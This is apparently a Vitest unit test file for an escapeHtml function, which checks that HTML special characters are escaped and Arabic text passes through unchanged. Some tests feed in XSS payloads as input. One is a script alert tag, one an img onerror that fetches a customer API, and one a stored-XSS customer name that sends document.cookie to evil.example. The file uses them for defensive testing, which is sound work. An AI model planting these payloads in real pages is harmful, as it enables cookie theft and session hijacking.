import { describe, it, expect } from "vitest";
import { escapeHtml } from "@/lib/print-utils";

describe("escapeHtml", () => {
  it("returns empty string for null", () => {
    expect(escapeHtml(null)).toBe("");
  });

  it("returns empty string for undefined", () => {
    expect(escapeHtml(undefined)).toBe("");
  });

  it("returns plain text unchanged", () => {
    expect(escapeHtml("hello world")).toBe("hello world");
  });

  it("escapes ampersands", () => {
    expect(escapeHtml("A&B")).toBe("A&amp;B");
  });

  it("escapes less-than", () => {
    expect(escapeHtml("1<2")).toBe("1&lt;2");
  });

  it("escapes greater-than", () => {
    expect(escapeHtml("2>1")).toBe("2&gt;1");
  });

  it("escapes double quotes", () => {
    expect(escapeHtml('say "hi"')).toBe("say &quot;hi&quot;");
  });

  it("escapes single quotes", () => {
    expect(escapeHtml("it's fine")).toBe("it&#39;s fine");
  });

  it("escapes a full XSS script tag payload", () => {
    const payload = '<script>alert("xss")</script>';
    const result = escapeHtml(payload);
    expect(result).not.toContain("<script>");
    expect(result).not.toContain("</script>");
    expect(result).toBe("&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;");
  });

  it("escapes an img onerror XSS payload so the tag cannot be parsed", () => {
    const payload = '<img src=x onerror="fetch(\'/api/customers\')">';
    const result = escapeHtml(payload);
    expect(result).not.toContain("<img");
    expect(result).toContain("&lt;img");
    expect(result).toContain("onerror=&quot;");
  });

  it("escapes all five special characters in a single string", () => {
    expect(escapeHtml(`& < > " '`)).toBe("&amp; &lt; &gt; &quot; &#39;");
  });

  it("handles a customer name that is a stored-XSS payload", () => {
    const name = `<img src=x onerror="location='https://evil.example/?d='+document.cookie">`;
    const escaped = escapeHtml(name);
    expect(escaped).not.toMatch(/<img/i);
    expect(escaped).toContain("&lt;img");
    expect(escaped).toContain("onerror=&quot;");
  });

  it("preserves Arabic text without modification", () => {
    expect(escapeHtml("شركة محكم للتقنية")).toBe("شركة محكم للتقنية");
  });

  it("coerces non-string input to string before escaping", () => {
    expect(escapeHtml(String(42))).toBe("42");
  });
});
